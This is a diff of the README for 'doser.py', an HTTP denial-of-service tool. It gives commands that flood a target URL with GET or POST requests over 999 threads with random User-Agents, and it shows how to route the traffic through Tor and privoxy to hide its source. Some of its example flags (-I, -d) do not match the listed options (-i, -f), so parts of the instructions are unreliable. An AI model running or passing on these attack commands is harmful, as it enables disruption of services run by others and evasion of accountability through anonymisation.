@@ -1,36 +1,53 @@
 # doser.py
-DoS tool for HTTP requests (inspired by hulk but has more functionalities) written in Python:
-![](https://raw.githubusercontent.com/Quitten/doser.py/master/doser.jpg)
+Very simple DoS tool for HTTP requests in Python with random User-Agents.
+
+# Prerequisites
+Install requirements.
+`pip3 install -r requirement.txt`
 
 # Examples
 999 threads sends GET requests:
 
 ```bash
-python doser.py -t 999 -g 'https://targeted.site.com'
+python3 doser.py 'https://targeted.site.com'
 ```
 
 999 threads sends POST requests with json data:
 
 ```bash
-python doser.py -t 999 -p 'https://targeted.site.com' -ah 'Content-Type: application/json' -d '{"json": "payload"}'
+python3 doser.py -x POST -I 'Content-Type: application/json' -d '{"json": "payload"}' 'https://targeted.site.com'
 ```
 
 # Usage
-usage: doser.py [-h] [-g G] [-p P] [-d D] [-ah AH] [-t T]
+
+```bash
+
+usage: doser.py [-h] [-x X] [-f F] [-p P] [-i [I [I ...]]] [-t T] ...
+
+Simple python based HTTP load testing tool.
+
+positional arguments:
+  url
 
 optional arguments:
+  -h, --help      show this help message and exit
+  -x X            Request method (Default GET). Usage: -x POST URL
+  -f F            Payload for the request
+  -p P            Proxy url with host and port
+  -i [I [I ...]]  Addtional header/s. Usage: -i 'Content-type: application/json' 'User-Agent: Doser'
+  -t T            Number of threads to be used. Default 999
+```
 
-  -h, --help  show this help message and exit
-  
-  -g        Specify GET request. Usage: -g '< url >'
-  
-  -p        Specify POST request. Usage: -p '< url >'
-  
-  -d        Specify data payload for POST request
-  
-  -ah      Specify addtional header
-  
-  -t        Specify number of threads to be used
+# Proxy usage (example with Tor)
 
-# TODO:
-Rewrite to Golang :)
+1. Install prerequisites
+`apt install -y tor privoxy`
+
+2. Edit the config `/etc/privoxy/config`
+```
+listen-address 127.0.0.1:8118
+listen-address [::1]:8118
+forward-socks5t / 127.0.0.1:9050 .
+```
+
+Now run the doser with -p https://127.0.0.1:8118
